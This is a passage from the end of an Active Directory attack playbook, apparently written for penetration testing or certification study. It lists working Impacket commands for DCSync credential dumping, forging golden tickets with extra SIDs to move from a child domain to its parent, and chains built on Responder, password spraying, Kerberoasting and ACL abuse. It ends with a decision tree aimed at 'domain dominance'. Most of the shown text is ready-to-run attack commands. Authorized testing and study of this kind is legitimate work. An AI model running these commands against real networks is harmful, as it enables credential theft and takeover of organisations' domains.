# Then DCSync
secretsdump.py domain.local/Administrator:pass@<dc> -just-dc-user krbtgt
secretsdump.py domain.local/Administrator:pass@<dc> -just-dc
```

## I.14 - Trust Abuse Combo

```bash
# Parent → child: just DCSync child
secretsdump.py parent.local/Administrator:pass@<child_dc> -just-dc

# Child → parent: extract child krbtgt + forge
secretsdump.py child.parent.local/Administrator:pass@<child_dc> -just-dc-user krbtgt
# Get child SID via lookupsid
lookupsid.py child.parent.local/Administrator:pass@<child_dc> 0
# Forge with -extra-sid
ticketer.py -nthash <child_krbtgt> -domain-sid S-1-5-21-<child_sid> -domain child.parent.local -extra-sid S-1-5-21-<parent_sid>-519 Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass parent.local/Administrator@<parent_dc> -just-dc
```

## I.15 - Quick A→B Chain (from source module)

```
Scenario 1: SCF → Responder → Crack → SMB spray → DA
1. Writable share: drop .scf file
2. Responder logs NTLMv2
3. Crack with rockyou
4. CME spray that user/pass combo
5. Find DA session → psexec

Scenario 2: enum4linux → spray → BloodHound → Rubeus → Kerberoast
1. enum4linux-ng -A <dc>
2. kerbrute spray 'Welcome1'
3. bloodhound-python with valid creds
4. Find Kerberoastable user
5. Rubeus kerberoast → crack → use creds

Scenario 3: enum4linux → spray → BloodHound → ACL abuse → DCSync
1. enum4linux-ng -A <dc>
2. kerbrute spray 'Welcome1'
3. bloodhound-python with valid creds
4. Find GenericAll on Enterprise Key Admins
5. Add self to EKA → DCSync
```

---

# END OF METHODOLOGY

> This methodology is intended as a comprehensive, decision-tree-driven playbook for Active Directory enumeration and attack. Every command has been source-verified against `Active Directory Enumeration & Attacks.md`. Use the Quick Reference Decision Tree at the top to navigate, then drill into the relevant phase for technical detail.
>
> **Engagement success criteria:**
> 1. Initial foothold (no creds → first cred)
> 2. Credentialed enumeration (find high-value targets)
> 3. Privilege escalation (gain DA / EA / DCSync)
> 4. Domain dominance (krbtgt / Golden Ticket)
> 5. Cleanup & reporting (restore state, document)

```
"How do I approach a new AD target?"
→ Start at TOP decision tree → Phase 1 / 2 → work forward
→ Each phase has its own decision trees
→ Each technique has Linux + Windows examples
→ Appendix contains reference data (hashes, ports, SIDs, etc.)

"Got NTLMv2 hash from Responder, what now?"
→ Phase 3.1.4: crack with hashcat -m 5600
→ Got creds? → Phase 7 (credentialed enum)
→ Want to relay? → Phase 3.2 / 16.2 / 15.3

"Got DA, what now?"
→ Phase 15.1: DCSync → krbtgt
→ Phase 15.2: Golden Ticket
→ Cleanup → Phase 19

"Multiple domains?"
→ Phase 18 (Domain Trusts)
→ Child → Parent: raiseChild.py / ExtraSids
→ Cross-Forest: trust key forge / kerberoast
```


